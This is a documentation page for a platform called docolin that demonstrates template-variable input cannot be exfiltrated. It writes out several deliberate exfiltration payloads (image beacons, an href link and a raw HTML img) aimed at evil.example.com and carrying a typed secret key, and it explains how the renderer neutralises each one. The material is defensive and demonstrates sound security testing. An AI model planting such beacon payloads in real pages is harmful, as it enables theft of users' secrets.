---
title: Variables, red team
description: Live proof that reader input can be displayed but never transmitted, no auto-fetch, no click-target, no raw HTML. Open devtools -> Network and type a fake secret.
---

Type a fake secret below, then open **devtools -> Network** and watch: nothing
beacons out, and none of the "attacks" below carry your value anywhere. Every
one is a deliberate exfiltration attempt that the renderer neutralizes.

!!! inputs "Pretend this is sensitive"
    - secret\_key: API key { secret placeholder="type anything" }
    - leak := "<https://evil.example.com/collect?k=>" + urlencode(secret\_key)

## 1. Image beacon (the scary one: auto-fetch, no click)

Source: `![x]({{ leak }})` and `![x](https://evil.example.com/p.png?k={{ secret_key }})`

!\[x]\({{ leak }})

!\[x]\(<https://evil.example.com/p.png?k={{> secret\_key }})

The `{{` breaks the image destination grammar, so no `<img>` forms. Network tab
stays quiet. What you see above is literal text plus a chip, never a request.

## 2. Angle-bracket destination (tries to smuggle braces past the parser)

Source: `![a](<{{ leak }}>)`

![a](<{{ leak }}>)

An `<img>` does form here, but its `src` is the _literal_ `{{ leak }}`, not your
value, so at worst it 404s against docolin's own domain. Your key never leaves.

## 3. Link with your value in the href

Source: `[Click me](https://evil.example.com/collect?k={{ secret_key }})`

\[Click me]\(<https://evil.example.com/collect?k={{> secret\_key }})

Hover it (or click): the href is truncated at the braces
(`...?k=%7B%7B`), carrying no secret.

## 4. Raw HTML image

Source: `<img src="{{ leak }}">`

<img src="{{ leak }}">

Raw HTML is stripped by the sanitizer, so there is no element at all.

## 5. What DOES work (and is fine)

The constructed URL can be shown to you as text: {{ leak }}

That is a display chip, not a link, it is not clickable and fetches nothing. An
author showing you this is no different from writing "go to
evil.example.com/collect?k=YOUR\_KEY" in plain prose: it only matters if you
manually copy it into your address bar. docolin itself never transmits your
input anywhere; it lives only in your browser.

## 6. The leave-docolin interstitial

A normal external link in content warns before it takes you off-platform.
Click this, you should get a "Leaving docolin" confirmation showing the host:

[A real external link](https://example.com/some/path?ref=docolin)

An internal link does not warn (it stays on docolin):

[Back to welcome](/pangos/jungle-gym/welcome)

An absolute link to docolin itself is first-party, so it also does not warn:

[docolin.com](https://docolin.com/about)
